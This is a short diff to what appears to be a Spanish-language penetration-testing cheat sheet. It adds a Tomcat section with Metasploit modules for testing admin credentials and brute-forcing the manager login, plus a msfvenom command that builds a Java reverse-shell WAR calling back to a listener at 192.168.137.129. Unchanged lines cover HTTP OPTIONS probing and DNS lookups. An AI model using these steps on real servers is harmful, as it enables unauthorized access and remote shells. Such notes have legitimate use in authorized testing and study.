@@ -61,6 +61,12 @@ telnet URL 80
 OPTIONS / HTTP/1.1
 Host: foo.bar
 
+#TOMCAT
+use auxiliary/admin/http/tomcat_administration // Probar creds de admin
+use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
+	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=192.168.137.129 LPORT=2212 -f war > shell.war
+
+
 #DNS
 nslookup
 	set type=mx (para obtener servidores de correo corporativos)
